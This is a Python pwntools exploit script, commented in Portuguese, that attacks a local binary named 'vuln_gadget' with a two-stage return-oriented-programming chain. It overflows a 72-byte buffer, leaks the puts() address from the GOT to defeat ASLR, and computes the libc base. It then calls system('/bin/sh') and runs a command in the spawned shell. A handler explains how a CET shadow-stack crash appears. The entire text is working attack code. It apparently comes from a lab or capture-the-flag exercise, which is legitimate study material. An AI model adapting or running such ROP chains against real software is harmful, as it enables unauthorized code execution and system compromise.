#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

BIN = './vuln_gadget'
e = ELF(BIN)
libc = e.libc

OFFSET      = 72
POP_RDI     = 0x4011ba
VULNERAVEL  = e.symbols['vulneravel']
PUTS_GOT    = e.got['puts']
PUTS_PLT    = e.plt['puts']


def _handle_crash(p):
    """Trata a queda prematura do processo e identifica se o crash foi

    provocado pela mitigação Hardware-Enforced Stack Protection (CET)."""
    p.wait()
    status = p.poll()
    log.failure(f'O processo morreu antes de concluirmos o vazamento (status: {status}).')
    if status == -11:
        log.failure('SIGSEGV logo no primeiro RET forjado da chain e exatamente o que se '
                    'espera se a Shadow Stack (CET) estiver de fato ativa neste alvo.')
        log.info('Confira: dmesg | tail -- procure por "control protection" '
                 '(NAO por "segfault"/"general protection", que indicam outra causa).')
    raise SystemExit(1)


def stage1_leak(p):
    """Vaza o endereço runtime de puts() na libc via GOT e retorna

    para vulneravel() para permitir uma segunda injeção."""

    chain  = b'A' * OFFSET
    chain += p64(POP_RDI)
    chain += p64(PUTS_GOT)
    chain += p64(PUTS_PLT)
    chain += p64(VULNERAVEL)

    p.recvuntil(b'Entrada> ')
    p.send(chain)

    try:
        blob = p.recvuntil(b'Entrada> ', timeout=5)
    except EOFError:
        _handle_crash(p)

    if not blob:
        _handle_crash(p)

    leaked = blob.split(
        b'concluido.\n\n', 1
    )[1].split(
        b'\nEndereco', 1
    )[0]

    leaked = leaked.ljust(8, b'\x00')[:8]

    return u64(leaked)


def stage2_shell(p, libc_base):

    libc.address = libc_base

    pop_rdi_libc = next(
        libc.search(
            asm('pop rdi; ret'),
            executable=True
        )
    )

    ret_gadget = next(
        libc.search(
            asm('ret'),
            executable=True
        )
    )

    binsh = next(
        libc.search(
            b'/bin/sh\x00'
        )
    )

    system_addr = libc.symbols['system']

    chain  = b'A' * OFFSET
    chain += p64(pop_rdi_libc)
    chain += p64(binsh)
    chain += p64(ret_gadget)
    chain += p64(system_addr)

    p.send(chain)


def main():

    p = process(BIN)

    puts_runtime = stage1_leak(p)

    libc_base = puts_runtime - libc.symbols['puts']

    log.success(
        f'puts() vazado em tempo de execução: {hex(puts_runtime)}'
    )

    log.success(
        f'Base da libc calculada (ASLR já era!): {hex(libc_base)}'
    )

    stage2_shell(p, libc_base)

    p.sendline(b'id; echo PWned!')

    print(
        p.recvall(timeout=5).decode(errors='replace')
    )


if __name__ == '__main__':
    main()
